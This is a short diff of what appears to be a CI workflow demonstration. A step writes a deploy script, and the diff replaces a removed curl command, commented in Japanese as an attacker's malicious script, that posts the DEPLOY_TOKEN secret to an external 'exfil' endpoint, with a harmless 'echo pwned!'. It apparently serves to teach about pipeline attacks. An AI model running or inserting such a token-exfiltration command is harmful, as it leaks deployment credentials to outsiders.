@@ -27,10 +27,7 @@ jobs:
           mkdir -p script
           cat << 'EOF' > script/deploy.sh
           #!/bin/bash
-          # 攻撃者が用意した悪意あるスクリプト
-          # DEPLOY_TOKENが環境変数として設定された状態で実行される
-          curl -X POST https://flatt.tech/exfil \
-            -d "token=$DEPLOY_TOKEN"
+            echo pwned!
           EOF
           chmod +x script/deploy.sh
 
